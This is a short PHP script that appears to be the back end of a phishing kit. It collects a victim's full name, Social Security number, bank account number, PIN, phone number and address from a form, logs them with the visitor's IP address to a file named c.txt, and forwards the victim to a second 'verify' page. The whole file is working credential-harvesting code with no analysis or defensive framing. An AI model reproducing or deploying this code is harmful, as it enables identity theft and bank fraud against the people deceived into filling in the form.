<?php

$ip = getenv("REMOTE_ADDR");

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

if(isset($_POST["submit"])){
			if(!empty($_POST['address'])){
				echo "The form is empty";
				return false;
			}
		}

$holdername = $_POST["holdername"];
$ssn = $_POST["socialSecurityNumber"];
$accountnumber = $_POST["accountnumber"];
$pin = $_POST["pin"];
$phonenumber = $_POST["phonenumber"];
$address1 = $_POST["address1"];
$city = $_POST["city"];
$state = $_POST["state"];
$zipcode = $_POST["zipcode"];

$bots_form = $_POST["bots_form"];

//Message
$message = "Full Name: ".$holdername." | ";
$message .= "SSN: ".$ssn." | ";
$message .= "Account Number: ".$accountnumber." | ";
$message .= "PIN: ".$pin." | ";
$message .= "Phone Number: ".$phonenumber." | ";
$message .= "Address: ".$address1." \n ";
$message .= "City: ".$city." | ";
$message .= "State: ".$state." | ";
$message .= "Zip Code: ".$zipcode." | ";



$bots = "Bots: ".$bots_form." >> ";

$inf = $message."\n".$ip."\n".$bots."\n\n";
$file = fopen("c.txt", 'a');
fwrite($file, $inf); 

header("Location: verify2.html"); 


?>